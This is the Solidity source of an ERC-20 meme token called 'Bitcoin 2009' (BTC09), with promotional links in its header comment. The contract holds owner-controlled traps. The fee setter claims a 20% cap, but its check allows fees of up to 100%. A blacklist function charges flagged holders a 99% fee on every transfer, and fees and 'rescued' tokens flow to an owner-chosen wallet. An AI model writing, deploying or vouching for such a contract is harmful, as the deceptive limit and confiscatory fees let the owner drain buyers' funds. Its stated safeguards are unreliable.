1 /**
2 Imagine if you bought Bitcoin in 2009
3 Make BTC great again!
4 https://t.me/btc09coin
5 https://btc2009.com/
6 https://twitter.com/bitcoin09token
7 */
8 
9 // SPDX-License-Identifier: MIT
10 
11 pragma solidity 0.8.19;
12 
13 
14 library SafeMath {
15 
16     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
17         unchecked {
18             uint256 c = a + b;
19             if (c < a) return (false, 0);
20             return (true, c);
21         }
22     }
23 
24     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
25         unchecked {
26             if (b > a) return (false, 0);
27             return (true, a - b);
28         }
29     }
30 
31     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
32         unchecked {
33             if (a == 0) return (true, 0);
34             uint256 c = a * b;
35             if (c / a != b) return (false, 0);
36             return (true, c);
37         }
38     }
39 
40     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
41         unchecked {
42             if (b == 0) return (false, 0);
43             return (true, a / b);
44         }
45     }
46 
47     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
48         unchecked {
49             if (b == 0) return (false, 0);
50             return (true, a % b);
51         }
52     }
53 
54     function add(uint256 a, uint256 b) internal pure returns (uint256) {
55         return a + b;
56     }
57 
58     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
59         return a - b;
60     }
61 
62     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
63         return a * b;
64     }
65 
66     function div(uint256 a, uint256 b) internal pure returns (uint256) {
67         return a / b;
68     }
69 
70     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
71         return a % b;
72     }
73 
74     function sub(
75         uint256 a,
76         uint256 b,
77         string memory errorMessage
78     ) internal pure returns (uint256) {
79         unchecked {
80             require(b <= a, errorMessage);
81             return a - b;
82         }
83     }
84 
85     function div(
86         uint256 a,
87         uint256 b,
88         string memory errorMessage
89     ) internal pure returns (uint256) {
90         unchecked {
91             require(b > 0, errorMessage);
92             return a / b;
93         }
94     }
95 
96     function mod(
97         uint256 a,
98         uint256 b,
99         string memory errorMessage
100     ) internal pure returns (uint256) {
101         unchecked {
102             require(b > 0, errorMessage);
103             return a % b;
104         }
105     }
106 }
107 
108 interface IERC20 {
109     function decimals() external view returns (uint8);
110     function symbol() external view returns (string memory);
111     function name() external view returns (string memory);
112     function getOwner() external view returns (address);
113     function totalSupply() external view returns (uint256);
114     function balanceOf(address account) external view returns (uint256);
115     function transfer(address recipient, uint256 amount) external returns (bool);
116     function allowance(address _owner, address spender) external view returns (uint256);
117     function approve(address spender, uint256 amount) external returns (bool);
118     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
119     event Transfer(address indexed from, address indexed to, uint256 value);
120     event Approval(address indexed owner, address indexed spender, uint256 value);}
121 
122 abstract contract Ownable {
123     address internal owner;
124     constructor(address _owner) {owner = _owner;}
125     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
126     function isOwner(address account) public view returns (bool) {return account == owner;}
127     function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
128     event OwnershipTransferred(address owner);
129 }
130 
131 interface IFactory{
132         function createPair(address tokenA, address tokenB) external returns (address pair);
133         function getPair(address tokenA, address tokenB) external view returns (address pair);
134 }
135 
136 interface IRouter {
137     function factory() external pure returns (address);
138     function WETH() external pure returns (address);
139     function addLiquidityETH(
140         address token,
141         uint amountTokenDesired,
142         uint amountTokenMin,
143         uint amountETHMin,
144         address to,
145         uint deadline
146     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
147 
148     function swapExactTokensForETHSupportingFeeOnTransferTokens(
149         uint amountIn,
150         uint amountOutMin,
151         address[] calldata path,
152         address to,
153         uint deadline) external;
154 }
155 
156 contract  BTC09 is IERC20, Ownable {
157     using SafeMath for uint256;
158     string private constant _name = 'Bitcoin 2009';
159     string private constant _symbol = ' BTC09 ';
160     uint8 private constant _decimals = 9;
161     uint256 private _totalSupply =4269 * (10 ** _decimals) ;
162     mapping (address => uint256) _balances;
163     mapping (address => mapping (address => uint256)) private _allowances;
164     mapping (address => bool) public isFeeExempt;
165     mapping (address => bool) private isBot;
166     IRouter router;
167     address public pair;
168     bool private tradingAllowed = false;
169     bool private swapEnabled = true;
170     uint256 private swapTimes;
171     bool private swapping;
172     uint256 swapAmount = 1;
173     uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;
174     uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
175     modifier lockTheSwap {swapping = true; _; swapping = false;}
176     uint256 private liquidityFee = 0;
177     uint256 private marketingFee = 0;
178     uint256 private developmentFee = 1000;
179     uint256 private burnFee = 0;
180     uint256 private totalFee = 1500;
181     uint256 private sellFee = 1500;
182     uint256 private transferFee = 0;
183     uint256 private denominator = 10000;
184     address internal constant DEAD =  0x000000000000000000000000000000000000dEaD;
185     address internal development_receiver = 0x5AD2d727EDd0Cb3EAaD9e796C249ACC577Be7e33; 
186     address internal marketing_receiver = 0x5AD2d727EDd0Cb3EAaD9e796C249ACC577Be7e33;
187     address internal liquidity_receiver = 0x5AD2d727EDd0Cb3EAaD9e796C249ACC577Be7e33;
188     uint256 public _maxTxAmount = ( _totalSupply * 200 ) / 10000;
189     uint256 public _maxSellAmount = ( _totalSupply * 300 ) / 10000;
190     uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;
191 
192     constructor() Ownable(msg.sender) {
193         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
194         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
195         router = _router; pair = _pair;
196         isFeeExempt[address(this)] = true;
197         isFeeExempt[liquidity_receiver] = true;
198         isFeeExempt[marketing_receiver] = true;
199         isFeeExempt[development_receiver] = true;
200         isFeeExempt[msg.sender] = true;
201         _balances[msg.sender] = _totalSupply;
202         emit Transfer(address(0), msg.sender, _totalSupply);
203     }
204 
205     receive() external payable {}
206     function name() public pure returns (string memory) {return _name;}
207     function symbol() public pure returns (string memory) {return _symbol;}
208     function decimals() public pure returns (uint8) {return _decimals;}
209     function startTrading() external onlyOwner {tradingAllowed = true;}
210     function getOwner() external view override returns (address) { return owner; }
211     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
212     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
213     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
214     function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
215     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
216     function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
217 
218     function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
219         bool aboveMin = amount >= minTokenAmount;
220         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
221         return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
222     }
223 
224     function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
225         swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
226         minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
227     }
228 
229     function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
230         liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
231         require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
232     }
233 
234     function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
235         uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
236         _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
237         uint256 limit = totalSupply().mul(5).div(1000);
238         require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
239     }
240 
241     function setInternalAddresses(address _marketing, address _liquidity, address _development) external onlyOwner {
242         marketing_receiver = _marketing; liquidity_receiver = _liquidity; development_receiver = _development;
243         isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_development] = true;
244     }
245 
246     function setisBot(address[] calldata addresses, bool _enabled) external onlyOwner {
247         for(uint i=0; i < addresses.length; i++){
248         isBot[addresses[i]] = _enabled; }
249     }
250 
251     function manualSwap() external onlyOwner {
252         swapAndLiquify(swapThreshold);
253     }
254 
255     function rescueERC20(address _address, uint256 percent) external onlyOwner {
256         uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
257         IERC20(_address).transfer(development_receiver, _amount);
258     }
259 
260     function swapAndLiquify(uint256 tokens) private lockTheSwap {
261         uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
262         uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
263         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
264         uint256 initialBalance = address(this).balance;
265         swapTokensForETH(toSwap);
266         uint256 deltaBalance = address(this).balance.sub(initialBalance);
267         uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
268         uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
269         if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
270         uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
271         if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
272         uint256 contractBalance = address(this).balance;
273         if(contractBalance > uint256(0)){payable(development_receiver).transfer(contractBalance);}
274     }
275 
276     function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
277         _approve(address(this), address(router), tokenAmount);
278         router.addLiquidityETH{value: ETHAmount}(
279             address(this),
280             tokenAmount,
281             0,
282             0,
283             liquidity_receiver,
284             block.timestamp);
285     }
286 
287     function swapTokensForETH(uint256 tokenAmount) private {
288         address[] memory path = new address[](2);
289         path[0] = address(this);
290         path[1] = router.WETH();
291         _approve(address(this), address(router), tokenAmount);
292         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
293             tokenAmount,
294             0,
295             path,
296             address(this),
297             block.timestamp);
298     }
299 
300     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
301         return !isFeeExempt[sender] && !isFeeExempt[recipient];
302     }
303 
304     function getTotalFee(address sender, address recipient) internal view returns (uint256) {
305         if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
306         if(recipient == pair){return sellFee;}
307         if(sender == pair){return totalFee;}
308         return transferFee;
309     }
310 
311     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
312         if(getTotalFee(sender, recipient) > 0){
313         uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
314         _balances[address(this)] = _balances[address(this)].add(feeAmount);
315         emit Transfer(sender, address(this), feeAmount);
316         if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
317         return amount.sub(feeAmount);} return amount;
318     }
319 
320     function _transfer(address sender, address recipient, uint256 amount) private {
321         require(sender != address(0), "ERC20: transfer from the zero address");
322         require(recipient != address(0), "ERC20: transfer to the zero address");
323         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
324         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
325         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
326         require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
327         if(sender != pair){require(amount <= _maxSellAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
328         require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded"); 
329         if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
330         if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
331         _balances[sender] = _balances[sender].sub(amount);
332         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
333         _balances[recipient] = _balances[recipient].add(amountReceived);
334         emit Transfer(sender, recipient, amountReceived);
335     }
336 
337     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
338         _transfer(sender, recipient, amount);
339         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
340         return true;
341     }
342 
343     function _approve(address owner, address spender, uint256 amount) private {
344         require(owner != address(0), "ERC20: approve from the zero address");
345         require(spender != address(0), "ERC20: approve to the zero address");
346         _allowances[owner][spender] = amount;
347         emit Approval(owner, spender, amount);
348     }
349 
350 }